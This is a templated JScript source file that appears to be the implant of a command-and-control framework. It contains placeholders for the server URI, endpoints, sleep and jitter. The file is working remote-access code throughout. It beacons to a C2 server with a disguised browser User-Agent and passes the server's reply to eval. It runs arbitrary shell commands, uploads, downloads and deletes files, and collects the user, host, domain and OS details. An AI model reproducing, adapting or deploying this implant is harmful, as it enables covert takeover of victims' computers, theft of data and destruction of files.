var errors = 0;
var wscriptshell = new ActiveXObject("WScript.Shell");
var batch_response = '{{key}}';
var check_in_job_id = '';
var sleep = {{ sleep }};
var jitter = {{ jitter }};
var endpoints = {{ endpoints }};

function post(data){
  try {
    var winhttp = new ActiveXObject("WinHttp.WinHttpRequest.5.1");;
    winhttp.Open('Post', '{{ check_in_uri }}' + endpoints[Math.round(Math.random() * (endpoints.length - 1))] );
    winhttp.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0");
    winhttp.setRequestHeader("X-Frame-Options", "SAMEORIGIN");
    winhttp.setRequestHeader("Content-Type", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
    winhttp.Send(data);
    winhttp.WaitForResponse();
    return winhttp;
  } catch (e) {
    errors = errors + 1;
    if(errors > 50){
      WScript.Quit(1);
    }
  }
}

function kill(){
    WScript.Quit(1);
}

{% include "jscript_functions/base64.js" %}
{% include "jscript_functions/delfile.js" %}
{% include "jscript_functions/dir.js" %}
{% include  "jscript_functions/download.js" %}
{% include "jscript_functions/upload.js" %}
{% include "jscript_functions/cmd.js" %}


while (true) {
  try {
      eval("batch_request=" + post(batch_response).responseText + ";");
  } catch (e) {
      batch_response = '[{"jsonrpc": "2.0", "error": {"code":-32700, "message":b64e("Parse error")}, "id": "' + check_in_job_id + '"}]';
      WScript.Sleep(((sleep - (sleep * (jitter / 100.0))) + Math.random() * ((sleep * (jitter / 100.0)) * 2)) * 1000);
      continue;
  }
  try {
      batch_response = '[';
      for (var job in batch_request) {
          var id = batch_request[job].id
          var name = batch_request[job].name
          var args = batch_request[job].arguments.toString().split(',');
          try {
              var results = '';
              if ('check_in' == name){
                  check_in_job_id = id;
                  break;
              }
              if ('upload' === name) {
                  result = '"' + upload(b64d(args[0], "bin"), b64d(args[1])) + '"';
              }
              if ('download' === name) {
                  result = '"' + download(b64d(args[0])) + '"';
              }
              if ('dir' === name) {
                  result = '"' + dir(b64d(args[0])) + '"';
              }
              if ('whoami' === name) {
                  username = b64e(wscriptshell.ExpandEnvironmentStrings("%USERDOMAIN%") + '\\' + wscriptshell.ExpandEnvironmentStrings("%USERNAME%"));
                  result = '["' + username + '","' + username + '"]';
              }
              if ('tmp' === name) {
                  result = '"' + b64e(wscriptshell.ExpandEnvironmentStrings("%TMP%")) + '"';
              }
              if ('hostname' === name) {
                  hostname = b64e(wscriptshell.ExpandEnvironmentStrings("%COMPUTERNAME%"));
                  result = '["' + hostname + '","' + hostname + '"]';
              }
              if ('domain' === name) {
                  result = '"' + b64e(wscriptshell.ExpandEnvironmentStrings("%USERDOMAIN%")) + '"';
              }
              if ('os' === name) {
                  result = '"' + b64e(wscriptshell.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\ProductName") + ' ' + wscriptshell.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\CurrentBuildNumber")) + '"';
              }
              if ('cmd' === name) {
                  result = '"' + cmd(b64d(args[0])) + '"';
              }
              if ('delfile' === name) {
                  result = '"' + delfile(b64d(args[0])) + '"';
              }
              if ('delay' === name) {
                  result = '"' + b64e('Current sleep is ' + sleep + ' second(s) with a jitter of ' + jitter + '%') + '"';
              }
              if('set jitter' === name){
                  jitter = b64d(args[0]);
                  result = '["' + b64e('Changed jitter to ' + jitter + ' %') + '","' + b64e(jitter) + '"]';
              }
              if('set sleep' === name){
                  sleep = b64d(args[0]);
                  result = '["' + b64e('Changed sleep to ' + sleep + ' second(s)') + '","' + b64e(sleep) + '"]';
              }
              if('kill' === name){
                kill();
              }
              batch_response = batch_response + '{"jsonrpc": "2.0", "result": ' + result  + ',"id":"' + id + '"},';
          } catch (e) {
             batch_response = batch_response + '{"jsonrpc": "2.0", "error": {"code":-32602,"message":"' + b64e(e.message) + '"},"id":"' + id + '"},';
          }
      }
  } catch (e) {
      // caught for reliability
  }
  batch_response = batch_response + '{"jsonrpc": "2.0", "result": "", "id": "' + check_in_job_id + '"}]';
  WScript.Sleep(((sleep - (sleep * (jitter / 100.0))) + Math.random() * ((sleep * (jitter / 100.0)) * 2)) * 1000);
}